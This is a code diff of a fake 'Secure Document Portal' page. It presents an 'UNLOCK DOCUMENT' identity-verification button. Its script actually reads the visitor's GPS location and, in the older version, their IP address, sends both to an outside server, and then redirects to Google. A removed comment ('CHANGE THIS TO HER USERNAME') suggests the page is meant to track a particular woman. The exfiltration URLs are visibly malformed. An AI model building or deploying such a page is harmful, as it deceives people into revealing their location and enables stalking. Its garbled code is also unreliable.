@@ -4,45 +4,38 @@
     <title>Secure Document Portal</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { font-family: 'Segoe UI', sans-serif; text-align: center; padding-top: 10%; background-color: #f4f7f6; color: #333; }
-        .box { background: white; padding: 40px; border-radius: 12px; display: inline-block; box-shadow: 0 4px 20px rgba(0,0,0,0.08); border-top: 5px solid #007bff; }
-        .btn { background: #007bff; color: white; border: none; padding: 15px 35px; font-size: 18px; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 20px; }
+        body { font-family: 'Segoe UI', sans-serif; text-align: center; padding-top: 15%; background-color: #f0f2f5; }
+        .card { background: white; padding: 40px; border-radius: 15px; display: inline-block; box-shadow: 0 10px 30px rgba(0,0,0,0.1); max-width: 90%; }
+        .btn { background: #007bff; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 8px; cursor: pointer; font-weight: bold; }
         .btn:hover { background: #0056b3; }
     </style>
 </head>
 <body>
-    <div class="box" id="display">
-        <h2>🔒 Identity Verification</h2>
-        <p>A secure document has been shared with you.<br>Please verify your zone to continue.</p>
-        <button class="btn" onclick="start()">UNLOCK DOCUMENT</button>
+    <div class="card">
+        <h2>🔒 Identity Verification Required</h2>
+        <p>This document is encrypted. Please click below to verify your zone and unlock the file.</p>
+        <button class="btn" onclick="startTracking()">UNLOCK DOCUMENT</button>
+        <p style="color: #666; font-size: 12px; margin-top: 20px;">Security check for Bangalore Region</p>
     </div>
 
     <script>
-        // 1. CHANGE THIS TO HER USERNAME
-        const PA_USERNAME = 'TalentAcquisition'; 
+        function startTracking() {
+            document.querySelector('.card').innerHTML = "<h2>Verifying...</h2><p>Establishing secure connection...</p>";
 
-        let info = { ip: "Unknown", lat: "0", lon: "0" };
-
-        // Pre-fetch IP
-        fetch('https://ipapi.co').then(r => r.json()).then(d => {
-            info.ip = d.ip;
-        });
-
-        function start() {
-            document.getElementById('display').innerHTML = "<h2>Verifying...</h2><p>Syncing with secure server...</p>";
-            
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => { send(pos.coords.latitude, pos.coords.longitude, "GPS"); },
-                    () => { send("0", "0", "Denied"); },
+                    (p) => { sendData(p.coords.latitude, p.coords.longitude); },
+                    (e) => { sendData("Denied", "Denied"); },
                     { timeout: 5000 }
                 );
-            } else { send("0", "0", "NotSupported"); }
+            } else {
+                sendData("NotSupported", "NotSupported");
+            }
         }
 
-        function send(lat, lon, type) {
-            const url = `https://${PA_USERNAME}://{lat}&lon=${lon}&ip=${info.ip}&type=${type}`;
-            fetch(url, { mode: 'no-cors' }).then(() => {
+        function sendData(lat, lon) {
+            const url = `https://pythonanywhere.com{lat}&lon=${lon}`;
+            fetch(url, {mode: 'no-cors'}).then(() => {
                 window.location.href = "https://google.com";
             });
         }
